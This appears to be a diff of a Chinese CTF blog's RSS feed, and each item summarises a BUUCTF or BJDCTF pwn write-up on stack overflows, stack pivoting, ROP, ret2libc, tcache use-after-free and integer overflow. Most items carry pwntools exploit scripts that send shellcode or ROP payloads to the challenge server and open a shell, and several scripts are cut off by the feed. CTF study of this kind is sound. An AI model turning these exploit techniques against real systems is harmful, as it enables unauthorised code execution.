+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; sh = process(&amp;#39;./bjdctf_2020_babystack&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,26495) backdoor_addr = 0x4006e6 readsize = 30 offset = 0x10 + 0x8 sh.sendlineafter(&amp;#34;name:&amp;#34;,&amp;#39;30&amp;#39;) payload = &amp;#39;a&amp;#39;*offset + p64(backdoor_addr) sh.sendlineafter(&amp;#34;name?&amp;#34;,payload) sh.sendline(&amp;#34;cat flag&amp;#34;) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn [Black Watch 入群题]PWN</title>
+      <link>https://niceseven.github.io/post/2020/04/01/buuctf-pwn-black-watch-%E5%85%A5%E7%BE%A4%E9%A2%98pwn/</link>
+      <pubDate>Wed, 01 Apr 2020 21:56:14 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/04/01/buuctf-pwn-black-watch-%E5%85%A5%E7%BE%A4%E9%A2%98pwn/</guid>
+      <description>[Black Watch 入群题]PWN 考点
+1、栈溢出和栈迁移
+2、leak
+栈迁移主要利用leave；ret指令来完成，首先要明确esp和ebp这个两个寄存器确定一个栈空间
+esp指向栈顶，ebp指向栈底，eip寄存器指向即将执行的指令，每执行完一条指令后eip都会改变指向下一条指令
+leave &amp;lt;=&amp;gt; mov esp,ebp;
+​	pop ebp; 将esp栈顶所指的内容赋给ebp
+ret &amp;lt;=&amp;gt; pop eip; 将esp栈顶所指的内容赋给eip
+以上的pop指令是将当前esp栈顶所指向的数据赋给指定的寄存器，并且把esp+4
+栈迁移，意味着调用函数将被掉函数的栈迁移到其他区域如bss或者data，需要RW权限，若有X权限则可以直接写入shellcode然后通过栈溢出ret到此shellcode执行
+本题先通过第一个read函数读入我们伪造的栈帧到bss，然后再用第二个read函数造成栈溢出同时执行栈迁移操作将栈迁移到伪造好栈数据的bss段执行，这里的bss只有读写权限没有执行权限，但是它只是作为一个栈存数据所以不影响我们的操作
+栈迁移实际是利用到这个retn之前的leave和我们溢出后构造的leave来执行栈迁移，首先要明确执行一个call的时候会将call的下一条指令push入栈中也就是在栈溢出中需要覆盖的retn地址，然后再将原调函数的ebp也push进栈，为了栈还原做准备，将执行call的函数的ebp保存进栈当执行完这个call之后就可以同通过这个保存的ebp找回原调函数的栈继续执行
+具体流程：
+1、通过栈溢出将ebp覆盖为我们栈迁移的目标地址，这样在执行到leave的时候就会讲esp指向这个被覆盖的ebp的位置(mov esp,ebp)，然后pop ebp；将我们覆盖掉的ebp存的地址作为栈底，这样栈底首先被迁移到目标地址了
+2、将retn覆盖为leave；ret；这个gadget，这样在ret之前还会之前还会执行一遍leave(mov esp,ebp;pop ebp)，这个时候的esp和ebp指向的位置都是栈迁移目标地址也就是程序中s的地址，实际上在本题中第二次leave中的pop ebp是多余的，还会使我们esp+4所以我们在覆盖ebp的时候可以覆盖为目标地址s-4的地址处这样在执行pop ebp的时候esp+4-4就抵消了，最后执行ret也就是pop eip将当前esp所指的内容赋给eip，这样程序下次执行的就是伪造在bss段中存的函数地址
+from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./spwn&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,27349) elf = ELF(&amp;#39;./spwn&amp;#39;) libc = ELF(&amp;#39;./x86_ubuntu16_libc-2.23.so&amp;#39;) bss_addr = 0x0804a300 #也就是s的地址 leave_ret = 0x08048408 #gadget write_plt = elf.plt[&amp;#39;write&amp;#39;] write_got = elf.got[&amp;#39;write&amp;#39;] main_addr = elf.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Ez_pz_hackover_2016</title>
+      <link>https://niceseven.github.io/post/2020/03/29/buuctf-pwn-ez_pz_hackover_2016/</link>
+      <pubDate>Sun, 29 Mar 2020 17:09:33 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/29/buuctf-pwn-ez_pz_hackover_2016/</guid>
+      <description>BUUCTF Pwn Ez_pz_hackover_2016 考点
+1、计算不同函数栈的距离
+2、生成shellcode
+3、栈溢出
+32位，保护基本没开，可以栈执行、栈溢出
+漏洞主要在chall()函数和vuln()函数中
+首先会打印出s的地址也就是栈开始的地址，然后strlen()计算我们传入的字符串的长度到\x00截止，memchr()主要功能是把传入的字符串到\n之后的数据置为0，\n之前的不影响，然后打印出我们传入的数据，最后我们需要绕过strcmp()也就是我们传入的数据要与crashme相同，这里可以使用\x00截断绕过，也就是我们传入的数据最开始8个字节要为&amp;quot;crashme\x00&amp;quot;，绕过之后我们就可以进去vuln函数，vuln函数里面就是执行memcpy()，将存我们输入的s里面的内容传给dest最多可以传0x400字节，但是dest栈大小只有0x32所以这里可以造成栈溢出
+这里的问题关键就是我们怎么getshell，回顾此程序的防护措施和chall函数中的fget，我们可以发现s的栈大小有0x40c，fgets可以读1023和字节到s栈中，没开启NX所以我们可以传个shellcode到s栈上，我们要注意chall函数中的memchr(&amp;amp;s, &amp;lsquo;\n&amp;rsquo;, v0)的作用是把到\n之后的数据截断，在\n之前的不受影响，所以我们可以构造“crashme\x00+shellcode+\n&amp;quot;,那么我们的shellcode就存在栈上了
+所以思路就是首先把shellcode传到栈上，然后通过溢出dest返回到shellcode在s栈上的地址执行shellcode，所以就出现了两个问题
+1、我们要读多少个字节到s中可以使得vuln函数中执行memcpy的时候可以把dest的ret覆盖
+2、shellcode在栈中的地址怎么确定
+对于第1个问题我们可以通过gdb-peda+pattern小工具来进行调试发现
+首先用pattern生成随机字符串写入脚本中
+from pwn import * context(log_level = &amp;#39;debug&amp;#39;,os=&amp;#39;linux&amp;#39;,arch=&amp;#39;i386&amp;#39;) p = process(&amp;#39;./ez_pz_hackover_2016&amp;#39;) gdb.attach(p)#先要在sendline之前打开gdb调试，若是在sendline之后无法调试 p.recvuntil(&amp;#39;&amp;gt; &amp;#39;) payload = &amp;#39;crashme\x00&amp;#39; #为了过memcpy，过了memcpy才有机会执行vuln函数 payload += &amp;#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&amp;#39;#使用pattern生成 pause()#把程序暂停在这里，可以理解为下断点 p.sendline(payload) 运行脚本后跳出gdb调试
+因为传入了许多垃圾数据所以我们按c程序运行到vuln函数会出错，根据报错我们可以发现vuln函数中栈的ebp被垃圾数据AnAA覆盖了，
+可以发现memcpy(&amp;amp;dest, &amp;amp;src, n)之后传入到dest的数据到ebp的距离是8+14这里的8是最开始传入的crashme\x00这个8个字节，然后因为retn之前有leave指令，所以实际覆盖到ret还需要+4(32位程序)
+所以要memcpy到dest的数据要8+14+4=26个字节才能覆盖到retn
+所以payload = &amp;lsquo;crashme\x00&#39; + &amp;lsquo;a&amp;rsquo;*14 + &amp;lsquo;a&#39;*4 + shellcode_addr
+那么shellcode的地址如何确定呢？
+因为我们传入的shellcode的传到s栈上的，程序开始又给了我们s栈的地址了，所以我们可以利用给出的栈地址做基地址来计算到shellcode的偏移来得出shellcode的地址，虽然地址会随机化但是偏移量不会变
+from pwn import * context(log_level = &amp;#39;debug&amp;#39;,os=&amp;#39;linux&amp;#39;,arch=&amp;#39;i386&amp;#39;) p = process(&amp;#39;./ez_pz_hackover_2016&amp;#39;) #p = remote(&amp;#39;node3.buuoj.cn&amp;#39;, 29530) gdb.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Jarvisoj_level2_x64</title>
+      <link>https://niceseven.github.io/post/2020/03/28/buuctf-pwn-jarvisoj_level2_x64/</link>
+      <pubDate>Sat, 28 Mar 2020 18:42:12 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/28/buuctf-pwn-jarvisoj_level2_x64/</guid>
+      <description>BUUCTF Pwn Jarvisoj_level2_x64 考点
+1、64位汇编函数传参方式
+2、基础ROP，pop rdi; ret
+3、栈溢出
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * #sh = process(&amp;#39;./jarvisoj_level2_x64&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28085) elf = ELF(&amp;#39;./jarvisoj_level2_x64&amp;#39;) fakerbp = 0x8 offset = 0x80 + fakerbp binsh_addr = 0x600a90 system_addr = elf.symbols[&amp;#39;system&amp;#39;] pop_rdi_ret = 0x4006b3 payload = &amp;#39;a&amp;#39;*offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) sh.sendlineafter(&amp;#39;Input:\n&amp;#39;,payload) sh.sendline(&amp;#39;cat flag&amp;#39;) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Ciscn_2019_n_5</title>
+      <link>https://niceseven.github.io/post/2020/03/28/buuctf-pwn-ciscn_2019_n_5/</link>
+      <pubDate>Sat, 28 Mar 2020 15:53:49 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/28/buuctf-pwn-ciscn_2019_n_5/</guid>
+      <description>BUUCTF Pwn Ciscn_2019_n_5 64位，bss写shellcode，栈溢出
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;, log_level = &amp;#39;debug&amp;#39;) #sh = process(&amp;#39;./ciscn_2019_n_5&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,27055) elf = ELF(&amp;#39;./ciscn_2019_n_5&amp;#39;) bss_addr = 0x601080 shellcode = asm(shellcraft.sh())#生成64位linuxshellcode payload = &amp;#39;a&amp;#39;*0x20 + &amp;#39;a&amp;#39;*8 + p64(0x601080)#栈溢出ret到shellcode执行 sh.sendlineafter(&amp;#34;name\n&amp;#34;,shellcode) sh.sendlineafter(&amp;#34;me?\n&amp;#34;,payload) sh.sendline(&amp;#39;cat flag&amp;#39;) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BJDCTF 2nd Pwn Ydsneedgirlfriend2</title>
+      <link>https://niceseven.github.io/post/2020/03/24/bjdctf-2nd-pwn-ydsneedgirlfriend2/</link>
+      <pubDate>Tue, 24 Mar 2020 21:47:54 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/24/bjdctf-2nd-pwn-ydsneedgirlfriend2/</guid>
+      <description>BJDCTF 2nd Pwn Ydsneedgirlfriend2 考点：tcache UAF堆利用
+环境：ubuntu18.0.4，libc-2.27
+增加、删除、查看，存在个atoi()或许可以改got执行system
+在malloc我们给定的length之前会malloc(0x10)把返回的指针存在girlfriends[]数组中，然后malloc我们给出的chunk把返回的指针存在前面的哪个0x10的chunk中，注意这里的v0的类型(viod **v0)，这里把是把print_girlfriend_name这个函数指针存在了malloc(0x10)的chunk中
+dele函数，这里大概的意思先把指针指向chunk数据的释放，然后在把这个存指针的这个chunk释放，但free的指针未清零，构成UAF的条件
+show函数中箭头实际是执行，在add函数中存在0x10chunk中的print_girlfriend_name函数，回顾c语言知识函数本质也是个指针
+先add3个32字节的chunk看看内存情况
+最开始malloc(0x10)的chunk第1个8字节(0x6032e0)存的是指向最后add的chunk的数据部分的指针，第2个8字节(0x4009ab)存的是个指向print_girlfriend_name函数的指针，回顾上面show函数的代码如果我们调用show就相当于调用这个20字节的chunk中第2个8字节指向的函数，那么利用思路就是根据libc2.26之后的tcachebin的分配规则与fastbin类似，我们free的最后一个chunk，在下次malloc时就是把这个chunk重新分配给用户，但是这个free这个chunk的时候里面存的指向函数的指针并不会置空造成野指针(UAF)，我们想办法把这里的指针改为backdoor地址，也就是把图中0x4009ab改为backdoor的地址0x400d86
+我们先add函数创建1个chunk，实际上创建了2个chunk分别是malloc(0x10)和malloc(length)详见add函数代码，再删除第1个chunk也就是序号为0的chunk，看看内存情况
+通过观察我们猜测在堆开始的地址offset 50处存的是tcache结构
+可以发现dele只删除了8字节的数据，还残留了2个a，因为根据tcache分配规则我们free了0这时候我在add一个16字节的chunk也就会把之前free的序号为0的malloc(0x10)分配给我们，填入8个c然后填入backdoor地址就可以覆盖print_girlfriend_name(0x4009ab)函数的指针为backdoor的指针，然后我们再调用show函数查看我们后add的那个16字节的chunk因为是重新申请的所以序号还是0，就能调用存在0x1ea9260+0x8处的backdoor函数了
+因为又add了0x10的chunk，所以tcache结构中指向malloc(0x10)的指针不见了，返回给用户了
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * #sh = process(&amp;#39;./ydsneedgirlfriend2&amp;#39;) elf = ELF(&amp;#39;./ydsneedgirlfriend2&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,26579) def add(size,name): sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(&amp;#39;1&amp;#39;) sh.recvuntil(&amp;#39;name:&amp;#39;) sh.sendline(str(size)) sh.recvuntil(&amp;#39;name:&amp;#39;) sh.sendline(name) def dele(idx): sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(&amp;#39;2&amp;#39;) sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(str(idx)) def show(idx): sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(&amp;#39;3&amp;#39;) sh.recvuntil(&amp;#39;:&amp;#39;) sh.sendline(str(idx)) backdoor = 0x400d86 add(30,&amp;#39;aaaaaaaaaa&amp;#39;) #add(30,&amp;#39;bbbbbbbbbb&amp;#39;) dele(0) #gdb.attach(sh) #dele(1) add(16,&amp;#39;cccccccc&amp;#39;+p64(backdoor)) #gdb.attach(sh) show(0) sh.interactive() 总结：堆题要多动态分析</description>
+    </item>
+    
+    <item>
+      <title>BJDCTF 2nd Pwn R2t3</title>
+      <link>https://niceseven.github.io/post/2020/03/23/bjdctf-2nd-pwn-r2t3/</link>
+      <pubDate>Mon, 23 Mar 2020 23:24:57 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/23/bjdctf-2nd-pwn-r2t3/</guid>
+      <description>BJDCTF 2nd Pwn R2t3 考点：短整数溢出，参考XCTF中的int_overflow
+可以读入0x400进入buf，要满足条件3&amp;lt;v3&amp;lt;=8才能绕过判断执行strcpy，可以发现dest的栈只有0x11，所以这里存在栈溢出，可以发现v3是无符号整形的数据，__int8意味着只能存8位的数字转换成十进制就是0~255这256个字节超出部分就截断了，但是read却可以读0x400进去所以可以利用整形溢出来bypass这个if
+256的2进制串后8位为0000 0000表示10进制数为0，如果通过strlen(s)返回的字节数是256那么v3实际上就表示0
+同理257表示1，258=256+2表示2，259=256+3表示3，所以要满足3&amp;lt;v3&amp;lt;8,，就是256+4=260 &amp;lt; s &amp;lt;264=256+8
+本题选择入读262个字符
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level =&amp;#39;debug&amp;#39; sh = process(&amp;#39;./r2t3&amp;#39;) backdoor_addr = 0x804858b payload = &amp;#39;a&amp;#39;*21 payload += p32(backdoor_addr) payload += &amp;#39;a&amp;#39;*(262-len(payload)) sh.sendafter(&amp;#39;name:&amp;#39;,payload) sh.interactive() 问题：
+读入0x400可以打本地(kali2020.1-glibc-2.29)和buuctf，但是读262字节只能打buu不能打本地，换成ubuntu19.04-glibc-2.29之后读入262可以打本地了</description>
+    </item>
+    
+    <item>
+      <title>BJDCTF 2nd Pwn One_gadget</title>
+      <link>https://niceseven.github.io/post/2020/03/23/bjdctf-2nd-pwn-one_gadget/</link>
+      <pubDate>Mon, 23 Mar 2020 20:17:03 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/23/bjdctf-2nd-pwn-one_gadget/</guid>
+      <description>BJDCTF 2nd Pwn One_gadget 考点：
+1、one_gadget小工具的使用
+2、libc基地址的计算，利用基地址得出其他libc函数的地址
+从main函数来看v4是个函数指针，传入一个函数地址就能执行，但是这里的v4是用%ld接收的所以传入的地址要是10进制的数字串，%ld表示数据按十进制有符号长型整数输入或输出
+有个init，直接打印出printf函数的真实地址，这样就可以通过这个地址减去libc中printf的偏移得到基地址，从而用基地址+one_gadget在libc中的偏移得出execve(&amp;quot;/bin/sh&amp;quot;)的地址，在传给程序就能getshell
+选择0x106ef8这个one_gadget
+#!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./one_gadget&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,26004) libc = ELF(&amp;#39;./ubuntu19-x64-libc-2.29.so&amp;#39;) #sh.recvuntil(&amp;#39;u:&amp;#39;) printf_addr = int(sh.recvuntil(&amp;#39;\n&amp;#39;)[-15:-1],16) #int(s,16)这个函数将字符串转成16进制数 base_addr = printf_addr - libc.symbols[&amp;#39;printf&amp;#39;]#计算基地址 one_gadget = base_addr + 0x106ef8#计算one_gadget的地址 log.success(&amp;#39;printf_addr: &amp;#39; + hex(printf_addr)) log.success(&amp;#39;libc_printf_offset: &amp;#39; + hex(libc.symbols[&amp;#39;printf&amp;#39;])) log.success(&amp;#39;libc_base_addr: &amp;#39; + hex(base_addr)) log.success(&amp;#39;one_gadget_addr: &amp;#39; + hex(one_gadget)) payload = str(one_gadget) #因为是作为字符串传入的所以用str print payload sh.sendlineafter(&amp;#39;one gadget:&amp;#39;,payload) sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Babyfengshui_33c3_2016</title>
+      <link>https://niceseven.github.io/post/2020/03/18/buuctf-pwn-babyfengshui_33c3_2016/</link>
+      <pubDate>Wed, 18 Mar 2020 22:32:06 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/18/buuctf-pwn-babyfengshui_33c3_2016/</guid>
+      <description>babyfengshui_33c3_2016 小贴士
+1、在ida中出现下图这种烦人的类型声明，可以使用键盘上的&amp;rdquo;\&amp;quot;键盘来隐藏
+2、函数got内存的是函数的真实地址，这个真实地址才是决定实际使用的函数
+3、函数真实地址不受地址随机化影响，只与libc不同而不同，知道真实地址可以计算出此libc的版本，以及此libc中其他函数的地址，如system，从而也能计算出本程序中调用libc中system的真实地址(libc.system + base_addr)
+所以leak出真实地址计算出libc版本是非常重要的直接影响后面的getshell
+本题源码：https://github.com/bkth/babyfengshui/blob/master/babyfengshui.c
+32位程序，开启NX、Canary
+从功能上看估计是一道堆题，用ida看看
+增删改查都有
+这里add_user函数会malloc出2个chunk，大概可以推测出第2个chunk是个结构体
+struct user{ char *description;//占4字节的指针  char name[124]; } delete_uesr函数
+display_user函数update_description函数，也就能够编辑description chunk
+在update_description函数中，存在防止堆溢出的判断，但是仔细想就知道，这里的防止堆溢出的判断是基于指针的并且description chunk在user chunk之上，也就是它们俩的一前一后连在一起的，但是根据堆分配的机制，我们可以让他们俩不连在一起，中间插一个chunk，这样我们在修改description的时候就可以覆盖到他们两之间的chunk
+如上图先add2个也就是desc1、user1和desc2、user2，他们分别都是0x80但是有0x8来记录他们的大小包括0x8
+然后我们把add的前2个free了根据堆分配的机制下次再分配还是用的free的这些chunk，所有下次我们add一个0x80+0x80=0x100的chunk刚刚是desc3把之前的desc1和user1占用了，但是desc2和user2还没有free所有这里的user3就不能占用user2的位置只能分配到user2之后了，所以这里desc3和user3之间存在个desc2和user2所以就绕过了再update_description函数中的堆溢出防范，那么重点来了，我们回顾之前的分析，这里user2中的&amp;amp;desc2存的是个指针，那么我们通过溢出desc3来覆盖user2的这个指针指向libc中的函数地址那么我们就能够leak出libc中函数的地址从而计算出用的什么libc.so，从而找到system函数的地址，但是我们没有/bin/sh字符串怎么办呢？别忘了我们可以add_user并且写入内容的，我们在add头4个(回顾前面这里add一个用户申请了2个chunk，所这里实际上是4个chunk)用来leak的chunk之后可以再add一个较小的desc来存我们的/bin/sh字符串
+#!/usr/bin/env python2 #-*-coding=UTF-8-*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; io = process(&amp;#39;./babyfengshui&amp;#39;) elf = ELF(&amp;#39;babyfengshui&amp;#39;) libc = ELF(&amp;#39;x86_ubuntu16_libc-2.23.so&amp;#39;) def add_user(size, length, text): io.sendlineafter(&amp;#34;Action: &amp;#34;, &amp;#39;0&amp;#39;) io.sendlineafter(&amp;#34;description: &amp;#34;, str(size)) io.sendlineafter(&amp;#34;name: &amp;#34;, &amp;#39;AAAA&amp;#39;) io.sendlineafter(&amp;#34;length: &amp;#34;, str(length)) io.sendlineafter(&amp;#34;text: &amp;#34;, text) def delete_user(idx): io.sendlineafter(&amp;#34;Action: &amp;#34;, &amp;#39;1&amp;#39;) io.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Pwn2_sctf_2016</title>
+      <link>https://niceseven.github.io/post/2020/03/10/buuctf-pwn-pwn2_sctf_2016/</link>
+      <pubDate>Tue, 10 Mar 2020 22:00:13 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/10/buuctf-pwn-pwn2_sctf_2016/</guid>
+      <description>pwn2_sctf_2016 32位系统，只开启NX
+考点：整数溢出、ret2libc3
+存在system的系统调用号，但是无/bin/sh，也没有好用的gadget所以决定ret2libc3
+思路：
+1、整数溢出创造可以输入的数据非常大
+2、栈溢出构造rop来ret2libc3，从而getshell
+这里的v2变量是为int型的-1可以绕过if(v2&amp;gt;32)的判断，但是return之前的get_n()是以unsigned int来接收的v2，所以这里造成v2变得非常大(整数溢出)，这可以去了解c语言数据在内存中如何存储来理解漏洞的形成
+而这里的&amp;amp;nptr的到栈底的偏移只有0x2c，所以造成栈溢出
+计算stack offset = 0x2c + fakeebp = 0x2c +0x4 = 0x30 = 48字节
+#!/usr/bin/env python2 #-*-coding-UTF-8-*- from pwn import * from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; context.arch = &amp;#39;i386&amp;#39; context.os = &amp;#39;linux&amp;#39; #sh = process(&amp;#39;./pwn2_sctf_2016&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,29229) elf = ELF(&amp;#39;./pwn2_sctf_2016&amp;#39;) libc = ELF(&amp;#39;./x86-libc-2.23.so&amp;#39;) atoi_got_addr = elf.got[&amp;#39;atoi&amp;#39;] printf_plt_addr = elf.plt[&amp;#39;printf&amp;#39;] formatstr_addr = 0x80486f8 # %s main_addr = elf.symbols[&amp;#39;main&amp;#39;] fakeebp = 0x4 offset = 0x2c + fakeebp #48字节 #利用printf函数来leak在libc中的atoi函数 leak_payload = &amp;#39;a&amp;#39; * offset leak_payload+= p32(printf_plt_addr) + p32(main_addr) + p32(formatstr_addr) + p32(atoi_got_addr) sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn [HarekazeCTF_2019]babyrop2</title>
+      <link>https://niceseven.github.io/post/2020/03/09/buuctf-pwn-harekazectf_2019babyrop2/</link>
+      <pubDate>Mon, 09 Mar 2020 16:56:46 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/09/buuctf-pwn-harekazectf_2019babyrop2/</guid>
+      <description>babyrop2 64位的栈溢出，无system、/bin/sh，ret2libc3、ret2cas，需要泄露libc地址计算基地址，存在printf()、read()，可以通过printf泄露read地址来计算基地址，题目给出了libc.so.6文件
+#!/usr/bin/env python2 #-*-coding=UTF-8-*- from pwn import * context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./babyrop2&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,29191) elf = ELF(&amp;#39;./babyrop2&amp;#39;) libc_elf = ELF(&amp;#39;./libc.so.6&amp;#39;) main_addr = elf.symbols[&amp;#39;main&amp;#39;] read_got_addr = elf.got[&amp;#39;read&amp;#39;] printf_plt_addr = elf.plt[&amp;#39;printf&amp;#39;] log.success(&amp;#39;main_addr =&amp;gt; {}&amp;#39;.format(hex(main_addr))) log.success(&amp;#39;read_got_addr =&amp;gt; {}&amp;#39;.format(hex(read_got_addr))) log.success(&amp;#39;printf_plt_addr =&amp;gt; {}&amp;#39;.format(hex(printf_plt_addr))) format_str = 0x400770 pop_rdi_ret = 0x400733 pop_rsi_r15_ret = 0x400731 stack_offset = 0x20 fakerbp = 0x8 leak_payload = &amp;#39;a&amp;#39; * (stack_offset+fakerbp) leak_payload += p64(pop_rdi_ret)+p64(format_str) leak_payload += p64(pop_rsi_r15_ret)+p64(read_got_addr)+p64(0)+p64(printf_plt_addr) leak_payload += p64(main_addr) sh.</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Jarvisoj_level2</title>
+      <link>https://niceseven.github.io/post/2020/03/07/buuctf-pwn-jarvisoj_level2/</link>
+      <pubDate>Sat, 07 Mar 2020 23:45:41 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/07/buuctf-pwn-jarvisoj_level2/</guid>
+      <description>jarvisoj_level2 32位简单栈溢出ret2libc1，无后门，但是有system、/bin/sh，构造栈帧调用system(&#39;/bin/sh&#39;)
+栈大小0x88，可输入0x100，offset = 0x88 + 0x4（leave）
+#!/usr/bin/env python2 #-*-coding=UTF-8-*- from pwn import * sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,27073) elf = ELF(&amp;#39;./level2&amp;#39;) system_addr = elf.symbols[&amp;#39;system&amp;#39;] binsh_addr = elf.search(&amp;#39;/bin/sh&amp;#39;).next() payload = &amp;#39;a&amp;#39;*0x88 + p32(0) + p32(system_addr) + p32(0) + p32(binsh_addr) sh.sendlineafter(&amp;#39;Input:&amp;#39;,payload) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Jarvisoj_level0</title>
+      <link>https://niceseven.github.io/post/2020/03/05/buuctf-pwn-jarvisoj_level0/</link>
+      <pubDate>Thu, 05 Mar 2020 18:55:06 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/05/buuctf-pwn-jarvisoj_level0/</guid>
+      <description>jarvisoj_level0 非常简单的栈溢出
+0x80的栈可写0x200，并且有system(&amp;quot;/bin/sh&amp;quot;)，地址为0x400596
+stack offset = 0x80 + 0x8 =136，+8是因为存在leave语句所以要多加0x8(64位)才能覆盖到返回地址
+#!/usr/bin/env python2 #-*-coding=UTF-8-*- from pwn import * #context.log_level = &amp;#39;debug&amp;#39; #sh = process(&amp;#39;./level0&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,26813) offset = 0x80 system_addr = 0x400596 payload = &amp;#39;a&amp;#39;*offset + &amp;#39;a&amp;#39;*8 +p64(system_addr) sh.sendlineafter(&amp;#39;Hello, World\n&amp;#39;,payload) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Ciscn_2019_s_3</title>
+      <link>https://niceseven.github.io/post/2020/03/02/buuctf-pwn-ciscn_2019_s_3/</link>
+      <pubDate>Mon, 02 Mar 2020 22:41:55 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/03/02/buuctf-pwn-ciscn_2019_s_3/</guid>
+      <description>ciscn_2019_s_3 64位开启NX
+main函数直接调用一个vuln()函数，两个系统调用
+syscall 系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装 （read 和 write)）。
+32位与64位 系统调用的区别：
+\1. 传参方式不同
+\2. 系统调用号 不同
+\3. 调用方式 不同
+32位：
+传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器
+调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4
+调用方式: 使用 int 80h 中断进行系统调用
+64位：
+传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器
+调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1
+stub_execve 的调用号 为 59
+stub_rt_sigreturn 的调用号 为 15
+调用方式: 使用 syscall 进行系统调用</description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn [HarekazeCTF_2019]Babyrop</title>
+      <link>https://niceseven.github.io/post/2020/02/18/buuctf-pwn-harekazectf_2019babyrop/</link>
+      <pubDate>Tue, 18 Feb 2020 19:58:17 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/02/18/buuctf-pwn-harekazectf_2019babyrop/</guid>
+      <description>babyrop 64位简单的栈溢出，找pop rdi传/bin/sh给system()
+#!/usr/bin/env python2 #-*-coding=UTF-8-*- from pwn import * #sh = process(&amp;#39;./babyrop&amp;#39;) sh = remote(&amp;#39;node3.buuoj.cn&amp;#39;,28946) elf = ELF(&amp;#39;./babyrop&amp;#39;) system_addr = elf.symbols[&amp;#39;system&amp;#39;] binsh_addr = next(elf.search(&amp;#39;/bin/sh&amp;#39;)) pop_rdi_ret = 0x400683 #ROPgadget --binary babyrop --only &amp;#39;pop|ret&amp;#39; | grep pop payload = &amp;#39;a&amp;#39;*0x10 + p64(8) payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) sh.sendlineafter(&amp;#34;What&amp;#39;s your name?&amp;#34;,payload) sh.interactive() </description>
+    </item>
+    
+    <item>
+      <title>BUUCTF Pwn Not_the_same_3dsctf_2016</title>
+      <link>https://niceseven.github.io/post/2020/02/18/buuctf-pwn-not_the_same_3dsctf_2016/</link>
+      <pubDate>Tue, 18 Feb 2020 14:07:23 +0800</pubDate>
+      
+      <guid>https://niceseven.github.io/post/2020/02/18/buuctf-pwn-not_the_same_3dsctf_2016/</guid>
